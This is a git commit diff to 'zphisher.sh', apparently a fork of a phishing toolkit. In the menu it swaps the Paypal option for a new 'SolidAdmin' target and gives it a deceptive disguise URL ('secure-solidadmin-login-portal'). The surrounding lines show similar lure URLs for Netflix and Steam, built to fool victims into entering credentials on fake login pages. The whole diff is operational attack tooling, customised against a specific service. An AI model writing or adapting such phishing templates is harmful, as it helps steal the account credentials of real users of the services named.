e3e13dd1ba3043fb18d0bbd7a7b2a7b77d34aff6
Thug56 <141728254+Thug56@users.noreply.github.com>
2025-10-08 15:39:56 +0200

    Update zphisher.sh

--- zphisher.sh
+++ zphisher.sh
@@ -744,7 +744,7 @@ main_menu() {
 		${RED}[${WHITE}03${RED}]${ORANGE} Google        ${RED}[${WHITE}13${RED}]${ORANGE} Snapchat     ${RED}[${WHITE}23${RED}]${ORANGE} Origin
 		${RED}[${WHITE}04${RED}]${ORANGE} Microsoft     ${RED}[${WHITE}14${RED}]${ORANGE} Linkedin     ${RED}[${WHITE}24${RED}]${ORANGE} DropBox	
 		${RED}[${WHITE}05${RED}]${ORANGE} Netflix       ${RED}[${WHITE}15${RED}]${ORANGE} Ebay         ${RED}[${WHITE}25${RED}]${ORANGE} Yahoo		
-		${RED}[${WHITE}06${RED}]${ORANGE} Paypal        ${RED}[${WHITE}16${RED}]${ORANGE} Quora        ${RED}[${WHITE}26${RED}]${ORANGE} Wordpress
+		${RED}[${WHITE}06${RED}]${GREEN} SolidAdmin        ${RED}[${WHITE}16${RED}]${ORANGE} Quora        ${RED}[${WHITE}26${RED}]${ORANGE} Wordpress
 		${RED}[${WHITE}07${RED}]${ORANGE} Steam         ${RED}[${WHITE}17${RED}]${ORANGE} Protonmail   ${RED}[${WHITE}27${RED}]${ORANGE} Yandex			
 		${RED}[${WHITE}08${RED}]${ORANGE} Twitter       ${RED}[${WHITE}18${RED}]${ORANGE} Spotify      ${RED}[${WHITE}28${RED}]${ORANGE} StackoverFlow
 		${RED}[${WHITE}09${RED}]${ORANGE} Playstation   ${RED}[${WHITE}19${RED}]${ORANGE} Reddit       ${RED}[${WHITE}29${RED}]${ORANGE} Vk
@@ -773,10 +773,10 @@ main_menu() {
 			website="netflix"
 			mask='https://upgrade-your-netflix-plan-free'
 			tunnel_menu;;
-		6 | 06)
-			website="paypal"
-			mask='https://get-500-usd-free-to-your-acount'
-			tunnel_menu;;
+		6 |   06)
+	        website="solidadmin"
+	        mask='https://secure-solidadmin-login-portal'
+	        tunnel_menu;;
 		7 | 07)
 			website="steam"
 			mask='https://steam-500-usd-gift-card-free'
